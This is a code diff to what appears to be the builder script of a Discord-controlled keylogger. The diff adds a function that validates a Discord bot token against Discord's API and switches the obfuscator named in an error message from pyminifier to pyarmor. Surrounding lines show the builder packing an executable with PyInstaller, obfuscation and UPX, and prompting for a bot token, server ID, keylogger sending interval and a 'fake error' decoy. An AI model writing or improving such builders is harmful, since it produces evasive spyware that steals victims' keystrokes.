@@ -1,4 +1,4 @@
-import subprocess
+import subprocess, requests
 import os
 import shutil
 from colorama import Fore, Style
@@ -6,6 +6,22 @@ import sys
 import time
 from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
 
+
+def check_token(token):
+    headers = {
+        "Authorization": f"Bot {token}"
+    }
+
+    url = "https://discord.com/api/v10/users/@me"
+    try:
+        response = requests.get(url, headers=headers)
+    except:
+        return False
+    
+    if response.status_code == 200:
+        return True
+    else:
+        return False
 
 def create_env(dir):
     progress.start()
@@ -74,7 +90,7 @@ def build(path, icon, upx=True, obf=True):
         time.sleep(3)
     except:
         progress.stop()
-        print(Fore.RED +"[-] Please make sure you have pyinstaller, pyminifier and UPX installed under C:/UPX!"+ Style.RESET_ALL)
+        print(Fore.RED +"[-] Please make sure you have pyinstaller, pyarmor and UPX installed under C:/UPX!"+ Style.RESET_ALL)
         time.sleep(3)
         sys.exit(1)
     
@@ -113,6 +129,7 @@ progress = Progress(
 
 
 token = input("[?] Enter bot token: ")
+if not check_token(token): print(Fore.RED +"[-] Invalid bot token provided!"+ Style.RESET_ALL); sys.exit(1)
 guild_id = input("[?] Enter server ID (guild ID): ")
 interval = input("[?] Enter interval for keylogger sending (in secondes): ")
 error = input("[?] Enable fake error? [Y/n]: ")
